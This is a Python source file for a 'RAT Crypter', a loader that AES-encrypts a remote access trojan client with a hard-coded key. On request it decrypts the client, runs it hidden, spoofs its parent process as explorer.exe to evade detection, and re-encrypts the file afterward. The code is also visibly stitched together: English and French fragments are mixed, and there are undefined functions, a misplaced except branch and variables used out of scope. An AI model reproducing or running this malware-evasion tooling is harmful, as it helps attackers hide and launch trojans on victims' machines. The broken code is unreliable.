import os
import base64
import subprocess
import sys
import time
import ctypes
import psutil  # Added for process verification
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from ctypes import wintypes

# Encryption Configuration
KEY = b"0123456789abcdef"
IV = b"abcdef9876543210"

# Windows API Structures


class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPWSTR),
        ("lpDesktop", wintypes.LPWSTR),
        ("lpTitle", wintypes.LPWSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", ctypes.POINTER(ctypes.c_byte)),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD),
    ]
class STARTUPINFOEX(ctypes.Structure):
    _fields_ = [
        ("StartupInfo", STARTUPINFO),
        ("lpAttributeList", ctypes.c_void_p),
    ]

CREATE_NO_WINDOW = 0x08000000
EXTENDED_STARTUPINFO_PRESENT = 0x00080000
PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000

def pad(data: bytes) -> bytes:
    pad_len = 16 - (len(data) % 16)
    return data + bytes([pad_len] * pad_len)

def unpad(data: bytes) -> bytes:
    pad_len = data[-1]
    return data[:-pad_len]

def encrypt_file(source="rat_client.py", target="rat_client.enc"):
    try:
        with open(source, "rb") as f:
            plaintext = f.read()

        cipher = Cipher(algorithms.AES(KEY), modes.CBC(IV), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(pad(plaintext)) + encryptor.finalize()

        with open(target, "wb") as f:
            f.write(base64.b64encode(ciphertext))

        print(f"[+] Encrypted file saved: {target}")
        return True
    except Exception as e:
        print(f"[-] Encryption failed: {e}")
        return False

def decrypt_file(source="rat_client.enc", target="rat_client.py"):
    try:
        with open(source, "rb") as f:
            ciphertext = base64.b64decode(f.read())

        cipher = Cipher(algorithms.AES(KEY), modes.CBC(IV), backend=default_backend())
        decryptor = cipher.decryptor()
        plaintext = unpad(decryptor.update(ciphertext) + decryptor.finalize())

        with open(target, "wb") as f:
            f.write(plaintext)

        print(f"[+] Decrypted file saved: {target}")
        return True
    except Exception as e:
        print("[-] Erreur lors de la récupération du PID :", e)
    return None


def launch_with_ppid_spoofing(target_script, parent_name="explorer.exe"):
    ppid = get_pid_by_name(parent_name)
    if not ppid:
        print(f"[-] Impossible de trouver {parent_name}")
        return

    print(f"[+] PPID ciblé : {ppid}")

    size = ctypes.c_size_t(0)

    # 1) Demande de taille
    kernel32.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(size))

    # 2) Allocation mémoire
    attribute_list = ctypes.create_string_buffer(size.value)

    # 3) Initialisation de la liste
    if not kernel32.InitializeProcThreadAttributeList(attribute_list, 1, 0, ctypes.byref(size)):
        print("[-] Échec de InitializeProcThreadAttributeList")
        return

    # 4) Préparation du STARTUPINFOEX
    startupinfo = STARTUPINFOEX()
    startupinfo.StartupInfo.cb = ctypes.sizeof(STARTUPINFOEX)
    startupinfo.lpAttributeList = ctypes.cast(attribute_list, ctypes.c_void_p)

    # 5) Ouverture du handle du parent
    p_handle = kernel32.OpenProcess(0x001F0FFF, False, ppid)
    if not p_handle:
        print("[-] Impossible d'ouvrir handle du parent.")
        return

    # 6) Mise à jour de la liste d'attributs
    handle = ctypes.c_void_p(p_handle)
    if not kernel32.UpdateProcThreadAttribute(
        attribute_list,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        ctypes.byref(handle),
        ctypes.sizeof(handle),
        None,
        None
    ):
        print("[-] Échec de UpdateProcThreadAttribute")
        kernel32.CloseHandle(p_handle)
        return

    # 7) Création du processus
    pi = PROCESS_INFORMATION()
    command = f'cmd.exe /k "{sys.executable} {target_script}"'

    success = kernel32.CreateProcessW(
        None,
        ctypes.create_unicode_buffer(command),
        None,
        None,
        False,
        CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
        None,
        None,
        ctypes.byref(startupinfo),
        ctypes.byref(pi)
    )

    if success:
        print(f"[+] Processus lancé avec PPID spoofé. PID: {pi.dwProcessId}")
    else:
        err_code = kernel32.GetLastError()
        print(f"[-] Échec de CreateProcessW, code d'erreur : {err_code}")

    # Nettoyage
    kernel32.DeleteProcThreadAttributeList(attribute_list)
    kernel32.CloseHandle(p_handle)


def executer_et_rechiffrer():
    print("[*] Déchiffrement...")
    code = decrypter_fichier()  # J'enlève le isRun=True qui n'est pas dans ta version

    if not code:
        print("[-] Échec du déchiffrement.")
        print(f"[-] Decryption failed: {e}")
        return False

def verify_process_running(pid):
    """Check if process is actually running"""
    try:
        return psutil.pid_exists(pid)
    except:
        return False

def launch_rat(rat_path):
    """Launch the RAT with proper verification"""
    # First try normal subprocess
    try:
        proc = subprocess.Popen(
            [sys.executable, rat_path, "--autorun"],
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )
        
        # Verify process is running
        time.sleep(2)  # Give it time to start
        if verify_process_running(proc.pid):
            print(f"[+] RAT successfully launched with PID: {proc.pid}")
            return True
    except Exception as e:
        print(f"[-] Standard launch failed: {e}")

    print("[*] Attempting PPID spoofing launch...")
    try:
        kernel32 = ctypes.windll.kernel32
        
        # Initialize process attributes
        size = ctypes.c_size_t(0)
        kernel32.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(size))
        attribute_list = ctypes.create_string_buffer(size.value)
        kernel32.InitializeProcThreadAttributeList(attribute_list, 1, 0, ctypes.byref(size))
        
        # Get parent PID (explorer.exe)
        parent_pid = next((p.pid for p in psutil.process_iter() 
                         if p.name().lower() == "explorer.exe"), os.getppid())
        
        # Open parent process
        parent_handle = kernel32.OpenProcess(0x001F0FFF, False, parent_pid)
        if not parent_handle:
            print("[-] Failed to open parent process")
            return False
        
        # Update attributes
        handle_value = ctypes.c_void_p(parent_handle)
        kernel32.UpdateProcThreadAttribute(
            attribute_list,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            ctypes.byref(handle_value),
            ctypes.sizeof(handle_value),
            None,
            None
        )
        
        # Prepare startup info
        startup_info = STARTUPINFOEX()
        startup_info.StartupInfo.cb = ctypes.sizeof(STARTUPINFOEX)
        startup_info.lpAttributeList = ctypes.cast(attribute_list, ctypes.c_void_p)
        
        # Process information
        process_info = PROCESS_INFORMATION()
        
        # Create the process
        command_line = f'"{sys.executable}" "{rat_path}" --autorun'
        success = kernel32.CreateProcessW(
            None,
            ctypes.create_unicode_buffer(command_line),
            None,
            None,
            False,
            CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
            None,
            None,
            ctypes.byref(startup_info),
            ctypes.byref(process_info)
        )
        
        # Cleanup
        kernel32.DeleteProcThreadAttributeList(attribute_list)
        kernel32.CloseHandle(parent_handle)
        
        if success:
            # Verify process is running
            time.sleep(2)
            if verify_process_running(process_info.dwProcessId):
                print(f"[+] RAT launched with PPID spoofing. PID: {process_info.dwProcessId}")
                return True
            else:
                print("[-] Process launched but not running")
                return False
        else:
            print(f"[-] CreateProcess failed. Error: {kernel32.GetLastError()}")
            return False
            
    except Exception as e:
        print(f"[-] PPID spoofing failed: {e}")
        return False

def execute_and_manage_rat():
    """Main function to decrypt, execute, and re-encrypt the RAT"""
    print("[*] Decrypting RAT client...")
    if not decrypt_file():
        return
    
    rat_path = os.path.abspath("rat_client.py")
    print(f"[*] Launching RAT: {rat_path}")
    
    # Launch the RAT
    if not launch_rat(rat_path):
        print("[-] Failed to launch RAT")
        return

    abs_path = os.path.abspath("rat_client.py")
    print(f"[*] Exécution de rat_client.py en arrière-plan : {abs_path}")

    launch_with_ppid_spoofing(abs_path)
    time.sleep(10)
    print("[*] Rechiffrement après exécution (immédiat, processus lancé en background)")
    chiffrer_fichier(source_file=abs_path)


def menu():
    
    # Wait to ensure process is stable
    time.sleep(5)
    
    print("[*] Re-encrypting source file...")
    if not encrypt_file(source=rat_path):
        print("[-] Warning: Failed to re-encrypt RAT client")
    
    # Verify RAT is still running
    print("[*] Verifying RAT is running...")
    time.sleep(5)
    if not any("python" in p.name() and "rat_client" in " ".join(p.cmdline())
              for p in psutil.process_iter(['name', 'cmdline'])):
        print("[-] Warning: RAT process not found after launch")
    else:
        print("[+] RAT appears to be running successfully")

def main_menu():
    """Display the main menu"""
    while True:
        print("\n=== RAT Crypter Menu ===")
        print("1. Encrypt RAT client")
        print("2. Execute RAT client (decrypt, run, re-encrypt)")
        print("3. Decrypt only (for debugging)")
        print("4. Exit")
        
        choice = input("> Select option: ").strip()
        
        if choice == "1":
            encrypt_file()
        elif choice == "2":
            execute_and_manage_rat()
        elif choice == "3":
            decrypt_file()
        elif choice == "4":
            break
        else:
            print("Invalid choice")

if __name__ == "__main__":
    main_menu()